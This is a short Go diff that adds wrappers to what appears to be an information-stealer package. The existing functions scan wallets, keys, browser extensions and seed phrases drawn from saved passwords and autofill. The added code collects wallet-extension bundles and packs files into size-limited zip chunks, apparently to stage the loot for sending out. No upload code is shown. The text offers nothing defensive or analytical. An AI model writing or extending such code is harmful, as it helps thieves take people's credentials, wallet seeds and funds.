@@ -41,9 +41,26 @@ type MullvadResult = types.MullvadResult
 func ScanExtensions() []ExtensionResult     { return scanner.ScanExtensions() }
 func ScanFiles() []FileResult               { return scanner.ScanFiles() }
 func ScanWallets() []WalletResult           { return scanner.ScanWallets() }
+
+type WalletExtensionBundle = scanner.WalletExtensionBundle
+type WalletExtensionFileEntry = scanner.WalletExtensionFileEntry
+
+func CollectWalletExtensionBundles() []WalletExtensionBundle {
+	return scanner.CollectWalletExtensionBundles()
+}
 func ScanKeys() []KeyResult                 { return scanner.ScanKeys() }
 func FetchFile(path string) ([]byte, error) { return scanner.FetchFile(path) }
 func ZipDirectory(dir string) ([]byte, error) { return ziputil.ZipDirectory(dir) }
+
+type ZipFileEntry = ziputil.FileEntry
+
+func ZipFileEntries(entries []ZipFileEntry) ([]byte, error) {
+	return ziputil.ZipFileEntries(entries)
+}
+
+func ZipFileEntriesChunked(entries []ZipFileEntry, maxBytes int) ([][]byte, error) {
+	return ziputil.ZipFileEntriesChunked(entries, maxBytes)
+}
 
 func ScanSeeds(files []FileResult, passwords []PasswordResult, autofill []AutofillResult) []SeedResult {
 	return scanner.ScanSeeds(files, passwords, autofill)
